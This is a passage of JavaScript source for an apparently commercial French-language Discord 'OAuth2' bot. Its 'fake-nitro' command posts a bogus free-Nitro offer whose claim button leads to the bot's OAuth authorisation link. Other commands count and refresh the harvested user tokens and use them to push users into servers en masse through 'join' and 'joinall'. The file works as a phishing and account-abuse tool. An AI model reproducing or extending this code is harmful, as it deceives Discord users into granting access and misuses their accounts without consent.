const main = require("./classes/main");
const Discord = require("discord.js");
const path = require('path');
const axios = require('axios');
const { MessageEmbed } = require('discord.js');
const client1 = new Discord.Client()
const disbut = require('discord-buttons')

let isJoining = false ;
let lastUserCommandTime = 0;
const commandInfo = {};

const config = require("./config.js");
client1.login(config.token)
disbut(client1)
require("./database/main");

const fs = require("fs");
const cooldownsJoin = require("./cooldown/cooldownsjoin.json");
const cooldowns = require("./cooldown/cooldowns.json");
const express = require("express");
const fetch = require("node-fetch")

const app = express();
const client = new main({
  token: config.token,
  prefix: config.prefix,
  client_id: config.client_id,
  client_secret: config.client_secret,
  redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
  console.log(`Je suis connecté à ${bot.user.tag} (ID du bot : ${bot.user.id})`);
  bot.user.setPresence({ activity: { name: "Vérification du serveur", type: "PLAYING" }, status: "dnd" });
});

client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;

  msg = message
  AUTH_LINK = config.oauth_link

  if (command === "stop") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.");
      return message.channel.send(embed);
    }
    await client.stopJoiningUsers();
   const stopEmbed = new MessageEmbed()
   .setColor('#0000FF')
   .setDescription(`Les utilisateurs ont bien arrêté de rejoindre le serveur !`);
 return message.channel.send(stopEmbed)
}

  if (command === "owner-remove") {
    const authorizedUserID =  config.owner;
    if (message.author.id !== authorizedUserID) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande !");
      return message.channel.send(errorEmbed);
    }

    if (!message.mentions.members.first()) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Veuillez mentionner le membre Discord que vous souhaitez supprimer de la liste des propriétaires.");
      return message.channel.send(errorEmbed);
    }

    const mentionedMember = message.mentions.members.first();
    const ownerIDToRemove = mentionedMember.user.id;

    if (!config.owners.includes(ownerIDToRemove)) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Ce membre n'est pas un propriétaire du bot.");
      return message.channel.send(errorEmbed);
    }

    config.owners = config.owners.filter(id => id !== ownerIDToRemove);

    fs.writeFileSync("./config.js", `module.exports = ${JSON.stringify(config, null, 2)};`);

    const successEmbed = new Discord.MessageEmbed()
      .setColor("#0000FF")
      .setDescription(`Le membre ${mentionedMember.user.tag} a été supprimé de la liste des propriétaires.`);
    message.channel.send(successEmbed);
  }

  if (command === "owner-add") {
    const authorizedUserID = config.owner;
    if (message.author.id !== authorizedUserID) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.");
      return message.channel.send(errorEmbed);
    }

    if (!message.mentions.members.first()) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Veuillez mentionner le membre Discord que vous souhaitez ajouter en tant que nouveau propriétaire.");
      return message.channel.send(errorEmbed);
    }

    const mentionedMember = message.mentions.members.first();
    const newOwnerID = mentionedMember.user.id;

    if (config.owners.includes(newOwnerID)) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Ce membre est déjà un propriétaire du bot.");
      return message.channel.send(errorEmbed);
    }
    config.owners.push(newOwnerID);

    fs.writeFileSync("./config.js", `module.exports = ${JSON.stringify(config, null, 2)};`);

    const successEmbed = new Discord.MessageEmbed()
      .setColor("#0000FF")
      .setDescription(`Le membre ${mentionedMember.user.tag} a été ajouté en tant que nouveau propriétaire.`);
    message.channel.send(successEmbed);
  }  
  
  if (command === "owner-list") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const ownerUsernames = await Promise.all(
      config.owners.map((ownerID) => {
        const owner = client1.users.cache.get(ownerID);
        return owner ? owner.tag : `Utilisateur Inconnu (${ownerID})`;
      })
    );

    const ownerListEmbed = new Discord.MessageEmbed()
      .setTitle("Liste des Propriétaires")
      .setDescription(ownerUsernames.join("\n"))
      .setColor("#0000FF");

    message.channel.send(ownerListEmbed);
  }

  if (command === "fake-nitro") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const nitro = new Discord.MessageEmbed()
      .setColor("#FF00FF")
      .setDescription(`Click on Claim to get a free nitro ${config.emojis.nitro}!`)
      .setImage("https://cdn.discordapp.com/attachments/1118158930317693080/1134638537350848654/Capture_decran_2023-07-27_232153.png")
  
    const claimbouttons = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Claim Free Nitro')
      .setURL(config.oauth_link);
  
    message.channel.send({
      embed: nitro,
      button: claimbouttons
    }).catch(console.error);
  }
  
  if (command === "users") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
    const currentTime = Date.now();
    const cooldownDuration = 30 * 60 * 1000; 
    const lastUserCommandTime = cooldowns || 0;
  
    const cooldown100 = config.cooldown100; 
  
    if (cooldown100 && currentTime - lastUserCommandTime < cooldownDuration) {
      const remainingCooldown = (cooldownDuration - (currentTime - lastUserCommandTime)) / (1000 * 60);
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setTitle("Cooldown Commande")
        .setDescription(`Veuillez attendre ${remainingCooldown.toFixed(0)} minutes avant de réutiliser cette commande.`)
        .setFooter("OAuth2 Bot");

      const linkButton = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Supprimer le Cooldown')
        .setURL(config.support);
  
      message.channel.send({
        embed: errorEmbed,
        button: linkButton
      })
      .catch(console.error); 
  
      return;
    }

    cooldowns[message.author.id] = currentTime;
    fs.writeFileSync("./cooldown/cooldowns.json", JSON.stringify(cooldowns));
  
    const amount = await client.tokenCount();
    const embed = new Discord.MessageEmbed()
      .setColor("0000FF")
      .setTitle(`${config.emojis.user} Informations OAuth2`)
      .setDescription(`Il y a \`${amount}\` utilisateurs autorisés ! \n\nPlus vous avez d'utilisateurs autorisés, plus la commande \`joinall\` sera longue !`)
      .setFooter("OAuth2 Bot");

    const linkButton = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Serveur Support')
      .setURL(config.support);

    message.channel.send({
      embed: embed,
      button: linkButton
    })
    .catch(console.error); 
  }

if (command === "buy-info") {
  if (!config.owners.includes(message.author.id)) {
    const embed = new Discord.MessageEmbed()
      .setColor('#FF0000')
      .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
    return message.channel.send(embed);
  }

  const buyInfo = {
    purchaseDate: config.purchaseDate,
    expirationDate: config.expirationDate,
    buyerName: config.buyerName,
    botName: config.botName,
    botbuy: config.infobuy,
  };

  const embed = new Discord.MessageEmbed()
    .setColor("#0000FF")
    .setTitle("Informations d'achat du bot")
    .addField("Date d'achat", buyInfo.purchaseDate)
    .addField("Date d'expiration", buyInfo.expirationDate)
    .addField("Acheteur", buyInfo.buyerName)
    .addField("Type Buy", buyInfo.botbuy)
    .addField("Nom du bot", buyInfo.botName)
    .setFooter("OAuth2 Bot");

  const supportButton = new disbut.MessageButton()
    .setStyle('url')
    .setLabel('Serveur Support')
    .setURL(config.support); 

  message.channel.send({
    embed: embed,
    button: supportButton
  }).catch(console.error);
}

if (command === "role-delete") {
  try {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const filePath = './cooldown/serveur-role.json';

    fs.readFile(filePath, 'utf8', (err, fileData) => {
      if (err) {
        console.error('Erreur lors de la commande role-delete :', err);
        return message.reply('Une erreur est survenue lors de la récupération des informations du fichier serveur-role.json.');
      }

      const guildRoles = JSON.parse(fileData).guildRoles || [];

      const indexToDelete = parseInt(args[0]) - 1; 

      if (isNaN(indexToDelete) || indexToDelete < 0 || indexToDelete >= guildRoles.length) {
        const embed = new Discord.MessageEmbed()
          .setColor('#FF0000')
          .setDescription("Veuillez fournir un index valide pour le rôle à supprimer.");
        return message.channel.send(embed);
      }

      const deletedRole = guildRoles.splice(indexToDelete, 1);

      fs.writeFile(filePath, JSON.stringify({ guildRoles }, null, 2), 'utf8', (writeErr) => {
        if (writeErr) {
          console.error('Erreur lors de l\'écriture dans le fichier serveur-role.json :', writeErr);
          const embed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .setDescription("Une erreur est survenue lors de la suppression du rôle dans le fichier serveur-role.json.");
          return message.channel.send(embed);
        }

        const embed = new Discord.MessageEmbed()
          .setColor('#0000FF')
          .setDescription(`Le rôle ${indexToDelete + 1} a été supprimé avec succès.`);
        message.channel.send(embed);
      });
    });

  } catch (error) {
    console.error('Erreur lors de la commande role-delete :', error);
    const embed = new Discord.MessageEmbed()
      .setColor('#FF0000')
      .setDescription("Une erreur est survenue lors de la suppression du rôle dans le fichier serveur-role.json.");
    message.channel.send(embed);
  }
}

if (command === "role-config") {
  try {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const filePath = './cooldown/serveur-role.json';

    fs.readFile(filePath, 'utf8', (err, fileData) => {
      if (err) {
        console.error('Erreur lors de la commande info-role :', err);
        return message.reply('Erreur !');
      }

      const guildRoles = JSON.parse(fileData).guildRoles || [];

      const embed = new Discord.MessageEmbed()
        .setTitle('Informations sur les rôle définie :')
        .setColor('#0000FF')
        .setDescription('Voici toutes les informations sur les rôle définie :\n(Vous Pouvez les suprimer en faisant la commande `role-delete`)')
        .addField('Nombre de rôles définis', guildRoles.length, true);

      message.channel.send(embed);

      guildRoles.forEach((role, index) => {
        const guild = client1.guilds.cache.get(role.guildID);
        const serverName = guild ? guild.name : 'Serveur non trouvé';

        const roleEmbed = new Discord.MessageEmbed()
          .setTitle(`Rôle ${index + 1}`)
          .setColor('#0000FF')
          .addField('Nom du serveur', serverName, true)
          .addField('Serveur ID', role.guildID, true)
          .addField('Rôle ID', role.roleID, true);

        message.channel.send(roleEmbed);
      });
    });

  } catch (error) {
    console.error('Erreur lors de la commande info-role :', error);
    message.reply('Une erreur est survenue lors de la récupération des informations du fichier serveur-role.json.');
  }
}

  if (command === "setprefix") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
  
    const newPrefix = args[0];
  
    if (!newPrefix) {
      return message.channel.send("Veuillez fournir le nouveau préfixe que vous souhaitez définir.");
    }
  
    config.prefix = newPrefix;
  
    fs.writeFileSync("./config.js", `module.exports = ${JSON.stringify(config, null, 2)}`, "utf-8");
  
    const embed = new Discord.MessageEmbed()
      .setColor("#0000FF")
      .setDescription(`Le préfixe du bot a été mis à jour. Le nouveau préfixe est : \`${config.prefix}\``);
  
    message.channel.send(embed);
  }

  if (command === "info") {
    await client.infofonction(message, client1, client);
  }    
  
  if (command === "join") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.");
      return message.channel.send(embed);
    }

if (isJoining) {
  const errorEmbed = new Discord.MessageEmbed()
    .setColor("RED")
    .setDescription("Vous avez déjà une commande \"join\" ou \"joinall\"en cours d'exécution. Veuillez attendre qu'elle soit terminée.");
  message.channel.send(errorEmbed);
  return;
}
    if (config.cooldown100) {
      const cooldownDuration = 24 * 60 * 60 * 1000; 
      const currentTime = Date.now();
      const lastJoinTime = cooldownsJoin || 0;
  
      if (currentTime - lastJoinTime < cooldownDuration) {
        const remainingCooldown = (cooldownDuration - (currentTime - lastJoinTime)) / (1000 * 60 * 60);
        const errorEmbed = new Discord.MessageEmbed()
          .setColor("RED")
          .setTitle("Cooldown Commande")
          .setDescription(`Veuillez attendre ${remainingCooldown.toFixed(0)} heures avant de réutiliser la commande join.`)
          .setFooter("OAuth2 Bot");
        message.channel.send(errorEmbed);
        return;
      }

      cooldownsJoin[message.author.id] = currentTime;
      fs.writeFileSync("./cooldown/cooldownsjoin.json", JSON.stringify(cooldownsJoin));
    }
  
    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    if (args.length !== 3) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Utilisation incorrecte de la commande. Utilisez `-join (nombre de personne) (ID du serveur)`.");
      message.channel.send(errorEmbed);
      return;
    }
  
    const numPeople = parseInt(args[1]);
    const serverId = args[2];

    if (isNaN(numPeople) || numPeople <= 0) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Le nombre de personnes doit être un nombre valide et supérieur à 0.");
      message.channel.send(errorEmbed);
      return;
    }
  
    const targetGuild = client1.guilds.cache.get(serverId);
    if (!targetGuild) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription("Le bot n'est pas présent sur le serveur avec l'ID spécifié.");
      message.channel.send(errorEmbed);
      return;
    }

    const maxMembers = await client.tokenCount(); 
    const serverName = message.guild ? message.guild.name : 'Nom du serveur indisponible';
    if (numPeople > maxMembers) {
      const errorEmbed = new Discord.MessageEmbed()
        .setColor("RED")
        .setDescription(`Le nombre de personnes demandé dépasse le nombre maximum de membres disponibles dans la base de données. Il n'y a que ${maxMembers} membres disponibles pour être ajoutés.`);
      message.channel.send(errorEmbed);
      return;
    }
    isJoining = true;
    
    await client.handleJoinCommand(numPeople, serverId, message);
    isJoining = false;
  }

  if (command === "refresh") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
    try {
      const loadEmoji = config.emojis.load;
      const reparerEmoji = config.emojis.reparer;
      const amount = await client.tokenCount();
      

      const resetMessage = await message.channel.send(`${loadEmoji} ${amount} tokens sont en train d'être réinitialisés...`);
      await client.refreshTokens(message);
      
      resetMessage.edit(`${reparerEmoji} Les tokens ont été réinitialisés avec succès!`);
    } catch (err) {
      console.error("Erreur lors de la réinitialisation des tokens:", err);
      message.channel.send("Une erreur est survenue lors de la réinitialisation des tokens.");
    }
  }
  
  
  if (command === "links") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
    let AL = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Auth Link')
      .setURL(config.oauth_link)


    let IL = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Invite Link')
      .setURL(config.bot_link)

    const links = new Discord.MessageEmbed().setTitle(`${config.emojis.user} Lien Dashboard`).setDescription(`**${config.emojis.link} OAuth2 lien:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**${config.emojis.link} Invite Bot:\n**${config.bot_link}\n\`\`\`${config.bot_link}\`\`\``)
      .setColor("#0000FF")
    message.channel.send({ embed: links, button: [AL, IL] })
  }

if (command === "restart") {
  const restartMessage = await message.channel.send(`${config.emojis.load} **Le Bot est en train de se redémarrer, merci de patienter....**`);


  setTimeout(() => {
    restartMessage.edit(`${config.emojis.success} **Le Bot a été redémarré avec succès !**`);
  }, 10000); 
}


if (command === "help") {
  const helpEmbedPart1 = new Discord.MessageEmbed()
    .setColor("#0000FF")
    .setTitle("OAuth2 - Aide Commandes (Partie 1)")
    .setDescription("Voici la liste des commandes disponibles pour le bot OAuth2 :")
    .addField(`➤ users`, "Affiche le nombre total d'utilisateurs connectés sur tous les serveurs.(propriétaires uniquement)")
    .addField(`➤ joinall`, "Rejoint tous les serveurs où l'utilisateur est présent (propriétaires uniquement).")
    .addField(`➤ join`, "Fait rejoindre un certain nombre de persone sur un serveur défénie dans la commande.(propriétaires uniquement)")
    .addField(`➤ refresh`, "Actualise la liste des serveurs auxquels le bot est connecté (propriétaires uniquement).")
    .addField(`➤ restart`, "Redémarre le bot (propriétaires uniquement).")
    .addField(`➤ role-config`, " permet d'afficher toutes les informations contenues dans le fichier serveur-role.json, qui répertorie les rôles attribués à chaque serveur.(propriétaires uniquement)")
    .addField(`➤ role-delete`, " permet de supprimer un rôle spécifique du fichier serveur-role.json en fonction de son index dans la liste des rôles.(propriétaires uniquement)")
    .addField(`➤ ping`, "Affiche la latence du bot.")
    .addField(`➤ verify`, "Envoie un simple embed de vérification (propriétaires uniquement)")
    .addField(`➤ links`, "Affiche les liens utiles associés au bot.(propriétaires uniquement)")
    .addField(`➤ check`, "Envoie un simple embed de vérification (propriétaires uniquement)")
    .addField(`➤ bot-info`, "Affiche des informations sur le bot.");

  const helpEmbedPart2 = new Discord.MessageEmbed()
    .setColor("#0000FF")
    .setTitle("OAuth2 - Aide Commandes (Partie 2)")
    .addField(`➤ serveur-list`, "Affiche la liste des serveurs auxquels le bot est connecté (propriétaires uniquement).")
    .addField(`➤ fake-nitro`, "Génère un embed d'un free nitro pour les con de discord (propriétaires uniquement)")
    .addField(`➤ info`, "Donne les info sur le join en cours (propriétaires uniquement)")
    .addField(`➤ stop`, "Stop un Join ou un Joinall en cours (propriétaires uniquement)")
    .addField(`➤ webhook-info`, "Permet d'avoir les info sur le webhook mit en place (propriétaires uniquement)")
    .addField(`➤ set-webhook`, "Met en place un nouveux webhook pour les logs des connections auth(propriétaires uniquement)")
    .addField(`➤ serveur-leave`, "Fait quitter le bot du serveur spécifié par son ID (propriétaires uniquement).")
    .addField(`➤ serveur-invite`, "Affiche l'URL d'invitation du bot pour le serveur.(propriétaires uniquement)")
    .addField(`➤ owner-add`, "Ajoute un utilisateur en tant que propriétaire du bot (propriétaires uniquement).")
    .addField(`➤ owner-list`, "Affiche la liste des propriétaires du bot (propriétaires uniquement).")
    .addField(`➤ owner-remove`, "Supprime un utilisateur de la liste des propriétaires du bot (propriétaires uniquement).")
    .addField(`➤ embed`, "Crée et envoie un message embed personnalisé (propriétaires uniquement).")
    .addField(`➤ buy-info`, "Affiche les informations d'achat du bot, y compris la date d'achat, la date d'expiration, le nom de l'acheteur et le nom du bot.(propriétaires uniquement)");

  message.channel.send({ embed: helpEmbedPart1 }).then((msg) => {
    msg.react("⏪").then(() => {
      msg.react("⏭️").then(() => {
        const filter = (reaction, user) =>
          (reaction.emoji.name === "⏪" || reaction.emoji.name === "⏭️") &&
          user.id !== msg.client.user.id; 

        const collector = msg.createReactionCollector(filter, { time: 60000 });

        collector.on("collect", (reaction, user) => {
          if (reaction.emoji.name === "⏭️") {
            msg.edit({ embed: helpEmbedPart2 });
          } else if (reaction.emoji.name === "⏪") {
            msg.edit({ embed: helpEmbedPart1 });
          }
          if (user.id !== msg.client.user.id) {
            reaction.users.remove(user).catch((error) => console.error("Impossible de supprimer la réaction :", error));
          }
        });

        collector.on("end", () => {
          msg.reactions.removeAll().catch((error) => console.error("Impossible de supprimer les réactions :", error));
        });
      });
    });
  });
}

if (command === "serveur-list") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const servers = client1.guilds.cache.map((guild) => ({
      name: guild.name,
      id: guild.id,
      memberCount: guild.memberCount
    }));

    const serverListEmbed = new Discord.MessageEmbed()
      .setTitle("Liste des serveurs")
      .setThumbnail(client1.user.displayAvatarURL())
      .setColor("0000FF");

    servers.forEach((server) => {
      serverListEmbed.addField(server.name, `ID : ${server.id}\nMembres : ${server.memberCount}`);
    });
    message.channel.send(serverListEmbed);
  }

if (command === "serveur-invite") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const serverID = args[0];

    if (!serverID) {
      return message.channel.send("Veuillez fournir l'ID du serveur pour lequel vous souhaitez générer une invitation.");
    }

    const guild = client1.guilds.cache.get(serverID);
    if (!guild) {
      return message.channel.send("Le bot n'est pas présent dans le serveur avec l'ID fourni.");
    }

    try {
      const invite = await guild.channels.cache.random().createInvite({ maxAge: 86400, maxUses: 1 });
    
      const inviteEmbed = new Discord.MessageEmbed()
        .setColor("#0000FF")
        .setTitle(`Invitation pour le serveur : ${guild.name}`)
        .setThumbnail(client1.user.displayAvatarURL())
        .setDescription(`Voici l'invitation pour rejoindre le serveur :\n${invite}`)
        .setTimestamp();
      const inviteButton = new disbut.MessageButton()
        .setStyle("url")
        .setLabel("Rejoindre le serveur")
        .setURL(invite.url);
    
      message.channel.send({ embed: inviteEmbed, button: inviteButton });
    } catch (error) {
      message.channel.send("Une erreur s'est produite lors de la tentative de génération de l'invitation.");
    }}

  if (command === "embed") {
if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
  
    const embedTitle = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir un titre pour l'embed :");
    message.channel.send(embedTitle);
  
    let title;
    try {
      const collectedTitle = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      title = collectedTitle.first().content;
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }
  
    const embedDescription = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir une description pour l'embed :");
    message.channel.send(embedDescription);
  
    let description;
    try {
      const collectedDesc = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      description = collectedDesc.first().content;
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }

    const embedRole = new Discord.MessageEmbed()
      .setColor('#0000FF')
      .setDescription("Veuillez mentionner le rôle que vous souhaitez ajouter :");
    message.channel.send(embedRole);
  
    let roleMention;
    try {
      const collectedRole = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ['time'],
        }
      );
      roleMention = collectedRole.first().mentions.roles.first();
      if (!roleMention) throw new Error();
    } catch (error) {
      return message.channel.send("Temps écoulé ou rôle invalide. La commande a été annulée.");
    }
  
    const serverRoleData = {
      guildID: message.guild.id,
      roleID: roleMention.id,
    };
  
    let serverRoles = { guildRoles: [] };
    try {
      const data = fs.readFileSync('cooldown/serveur-role.json');
      serverRoles = JSON.parse(data);
    } catch (error) {
      console.error('Erreur lors de la lecture du fichier serveur-role.json:', error);
    }
  
    const existingRoleIndex = serverRoles.guildRoles.findIndex(
      (roleData) => roleData.guildID === serverRoleData.guildID
    );
    if (existingRoleIndex !== -1) {
      serverRoles.guildRoles[existingRoleIndex] = serverRoleData;
    } else {
      serverRoles.guildRoles.push(serverRoleData);
    }
    try {
      const jsonData = JSON.stringify(serverRoles, null, 2);
      fs.writeFileSync('cooldown/serveur-role.json', jsonData);
      console.log('Le rôle a été ajouté au fichier serveur-role.json avec succès.');
    } catch (error) {
      console.error('Erreur lors de l\'enregistrement des données dans le fichier serveur-role.json:', error);
    }
  
    const embedButtonLabel = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir un nom pour le bouton :");
    message.channel.send(embedButtonLabel);
  
    let buttonLabel;
    try {
      const collectedLabel = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      buttonLabel = collectedLabel.first().content;
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }

    const embedColor = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir une couleur (#0000FF ...) pour l'embed (ou 'off' pour ne pas en inclure) :");
    message.channel.send(embedColor);
  
    let color;
    try {
      const collectedColor = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      color = collectedColor.first().content.toLowerCase();
      if (color === "off") color = null;
      else if (!/^#(?:[0-9a-fA-F]{3}){1,2}$/.test(color)) {
        const invalidColorEmbed = new Discord.MessageEmbed()
          .setColor(`#0000FF`)
          .setDescription("La couleur spécifiée n'est pas valide. Utilisez un code couleur au format hexadécimal (par exemple, #FF0000 pour le rouge). La couleur sera définie par défaut.");
        message.channel.send(invalidColorEmbed);
        color = null;
      }
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }
  
    const embedFooter = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir un footer pour l'embed (ou 'off' pour ne pas en inclure) :");
    message.channel.send(embedFooter);
  
    let footer;
    try {
      const collectedFooter = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      footer = collectedFooter.first().content;
      if (footer === "off") footer = null;
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }

    const embedImage = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir une URL d'image pour l'embed (ou 'off' pour ne pas en inclure) :");
    message.channel.send(embedImage);
  
    let image;
    try {
      const collectedImage = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      image = collectedImage.first().content;
      if (image === "off") image = null;
      else if (!isValidURL(image)) {
        const invalidImageEmbed = new Discord.MessageEmbed()
          .setColor(`#0000FF`)
          .setDescription("L'URL de l'image spécifiée n'est pas valide. L'image ne sera pas incluse.");
        message.channel.send(invalidImageEmbed);
        image = null;
      }
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }

    const embedThumbnail = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Veuillez fournir une URL de miniature pour l'embed (ou 'off' pour ne pas en inclure) :");
    message.channel.send(embedThumbnail);
  
    let thumbnail;
    try {
      const collectedThumbnail = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      thumbnail = collectedThumbnail.first().content;
      if (thumbnail === "off") thumbnail = null;
      else if (!isValidURL(thumbnail)) {
        const invalidThumbnailEmbed = new Discord.MessageEmbed()
          .setColor(`#0000FF`)
          .setDescription("L'URL de la miniature spécifiée n'est pas valide. La miniature ne sera pas incluse.");
        message.channel.send(invalidThumbnailEmbed);
        thumbnail = null;
      }
    } catch (error) {
      return message.channel.send("Temps écoulé. La commande a été annulée.");
    }
  
    const embedChannel = new Discord.MessageEmbed()
      .setColor(`#0000FF`)
      .setDescription("Dans quel canal souhaitez-vous envoyer l'embed ? (mentionnez le salon) :");
    message.channel.send(embedChannel);
  
    let targetChannel; 
  
    try {
      const collectedChannel = await message.channel.awaitMessages(
        (m) => m.author.id === message.author.id,
        {
          max: 1,
          time: 30000,
          errors: ["time"],
        }
      );
      const channelID = collectedChannel.first().content.replace(/<#|>/g, ""); 
      targetChannel = message.guild.channels.cache.get(channelID);
      if (!targetChannel) throw new Error();
    } catch (error) {
      return message.channel.send("Temps écoulé ou salon invalide. La commande a été annulée.");
    }
  
    const embedToSend = new Discord.MessageEmbed()
      .setTitle(title)
      .setDescription(description);
  
    if (color) {
      embedToSend.setColor(color);
    }
  
    if (footer) {
      embedToSend.setFooter(footer);
    }
  
    if (image) {
      embedToSend.setImage(image);
    }
  
    if (thumbnail) {
      embedToSend.setThumbnail(thumbnail);
    }
  
    const inviteButton = new disbut.MessageButton()
      .setLabel(buttonLabel)
      .setURL(config.oauth_link)
      .setStyle("url");
  
    try {
      const sentMessage = await targetChannel.send({
        embed: embedToSend,
        components: [new disbut.MessageActionRow().addComponent(inviteButton)],
      });
  
      const embedSuccess = new Discord.MessageEmbed()
        .setColor(`#0000FF`)
        .setDescription(`L'embed avec le bouton a été envoyé avec succès dans le salon ${targetChannel}.`);
      message.channel.send(embedSuccess);
    } catch (error) {
      const embedError = new Discord.MessageEmbed()
        .setColor(`#0000FF`)
        .setDescription(`Une erreur est survenue lors de l'envoi de l'embed avec le bouton dans le salon : ${error}`);
      message.channel.send(embedError);
    }
  }
  

if (command === "serveur-leave") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }

    const serverID = args[0];
    if (!serverID) {
      return message.channel.send("Veuillez fournir l'ID du serveur que vous souhaitez quitter.");
    }

    const guild = client1.guilds.cache.get(serverID);
    if (!guild) {
      return message.channel.send("Le bot n'est pas présent dans le serveur avec l'ID fourni.");
    }

    try {
      const serverName = guild.name;
      const memberCount = guild.memberCount;

      const leaveEmbed = new Discord.MessageEmbed()
        .setColor("#0000FF")
        .setTitle(`Bot quittant le serveur : ${serverName}`)
        .setThumbnail(client1.user.displayAvatarURL())
        .setDescription(`Le bot a quitté le serveur ${serverName}\n\nNombre d'utilisateurs du serveur : ${memberCount}`)
        .setTimestamp();

      message.channel.send(leaveEmbed);

      await guild.leave();
